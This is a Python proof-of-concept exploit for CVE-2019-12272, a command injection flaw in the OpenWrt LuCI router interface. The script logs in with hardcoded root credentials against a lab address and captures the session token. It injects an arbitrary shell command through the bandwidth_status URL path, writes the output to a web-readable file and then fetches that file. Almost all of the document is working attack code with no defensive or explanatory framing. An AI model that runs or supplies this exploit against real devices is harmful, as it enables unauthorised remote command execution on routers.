import requests
from urllib.parse import urlparse
import sys
class CVE_2019_12272:
    def __init__(self):
        self.host = '192.168.56.3'
        self.uname = 'root'
        self.upass = '123456'
        self.stok = ''
        self.cookies = ''
        self.headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
}
    def login(self):

        data = {
  'luci_username': self.uname,
  'luci_password': self.upass
}
        response = requests.post('http://{host}/cgi-bin/luci'.format(host=self.host), headers=self.headers, data=data, verify=False,allow_redirects=False)
        self.cookies = response.cookies
        location = response.headers['location']
        self.stok = urlparse(location).params
        print(response.headers)
        print(response.cookies)
        #print(stok)
    def shell(self, cmd):
        url = 'http://{host}/cgi-bin/luci/;{stok}/admin/status/realtime/bandwidth_status/eth0%5E$({cmd}%3ecmd.txt)'.format(host=self.host,stok=self.stok,cmd=cmd)
        response = requests.get(url, headers=self.headers, cookies=self.cookies, verify=False)
    def view(self):
        url = 'http://{host}/cmd.txt'.format(host=self.host)
        response = requests.get(url, headers=self.headers)
        print(response.text)

if __name__ == "__main__":
    exp = CVE_2019_12272()
    exp.login()
    #exp.shell(sys.argv[1])
    #exp.view()